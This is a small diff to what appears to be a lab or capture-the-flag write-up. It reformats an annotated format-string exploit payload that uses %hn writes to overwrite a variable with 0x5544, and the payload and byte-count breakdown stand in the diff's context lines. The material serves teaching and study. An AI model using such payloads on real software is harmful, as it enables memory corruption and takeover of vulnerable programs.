@@ -68,15 +68,14 @@
     Use format specifiers to control the byte counter
 
     Format string breakdown:
-    text
-
+    ```
     [\x12\x98\x04\x08][\x10\x98\x04\x08][%250x%12\$hn][%21570x%13\$hn]
     |                 |                 |             |
     |                 |                 |             +-> Write 21570 + 258 = 21828 (0x5544) to address at offset 13 (m)
     |                 |                 +-> Write 250 + 8 = 258 (0x0102) to address at offset 12 (m+2)
     |                 +-> Address of m (offset 13)
     +-> Address of m+2 (offset 12)
-
+    ```
     Total bytes calculation:
 
         Initial: 8 bytes (2 addresses)
